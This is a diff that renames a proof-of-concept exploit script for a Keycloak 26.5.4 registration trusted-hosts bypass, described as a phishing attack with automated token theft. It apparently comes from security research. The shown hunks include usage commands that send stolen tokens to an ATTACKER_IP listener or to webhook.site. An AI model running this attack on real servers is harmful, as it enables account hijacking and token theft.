@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
+DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
 Severity: HIGH (CVSS 8.0)
 Target: Keycloak 26.5.4
 
 Realistic remote attacker PoC — runs from ANY machine, no admin access needed.
-Prerequisites: run setup_f5_admin.py once on the KC server to prepare users/roles.
+Prerequisites: run setup_dcr_admin.py once on the KC server to prepare users/roles.
 
 Attack flow:
 1. Login as testuser (public endpoint — no admin needed)
@@ -19,13 +19,13 @@ Attack flow:
 
 Usage:
   # With local listener (attacker has public IP):
-  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host ATTACKER_IP
+  python3 poc_dcr_hijack.py --host http://TARGET:8080 --attacker-host ATTACKER_IP
 
   # With webhook.site (attacker has no public IP):
-  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --use-webhook
+  python3 poc_dcr_hijack.py --host http://TARGET:8080 --use-webhook
 
   # Automated testing (simulate victim login):
-  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host TARGET_IP --auto-victim
+  python3 poc_dcr_hijack.py --host http://TARGET:8080 --attacker-host TARGET_IP --auto-victim
 """
 
 import http.client
@@ -61,7 +61,7 @@ captured_event = threading.Event()
 def banner():
     print(f"""
 {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
-║  Finding #5: DCR Trusted Hosts Bypass                        ║
+║  DCR Trusted Hosts Bypass                                    ║
 ║  Live Phishing Attack — Automated Token Theft                ║
 ║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
 ╚══════════════════════════════════════════════════════════════╝{RESET}
@@ -405,7 +405,7 @@ def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri, list
 
 def main():
     parser = argparse.ArgumentParser(
-        description="PoC Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack (Remote Attacker)")
+        description="PoC: DCR Trusted Hosts Bypass — Live Phishing Attack (Remote Attacker)")
     parser.add_argument("--host", required=True,
                         help="Keycloak public URL (e.g. http://46.101.162.187:8080)")
     parser.add_argument("--attacker-host", default=None,
@@ -426,8 +426,8 @@ def main():
     if not args.attacker_host and not args.use_webhook:
         fail("Must specify either --attacker-host <IP> or --use-webhook")
         print(f"\n  {YELLOW}Examples:{RESET}")
-        print(f"    python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host YOUR_IP")
-        print(f"    python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --use-webhook")
+        print(f"    python3 poc_dcr_hijack.py --host http://TARGET:8080 --attacker-host YOUR_IP")
+        print(f"    python3 poc_dcr_hijack.py --host http://TARGET:8080 --use-webhook")
         return 1
 
     if args.attacker_host and args.use_webhook:
@@ -471,7 +471,7 @@ def main():
     attacker_token = data.get("access_token", "")
     if not attacker_token:
         fail(f"Login failed: {data}")
-        fail("Ensure setup_f5_admin.py has been run first!")
+        fail("Ensure setup_dcr_admin.py has been run first!")
         return 1
     success(f"Login successful — token: {attacker_token}")
 
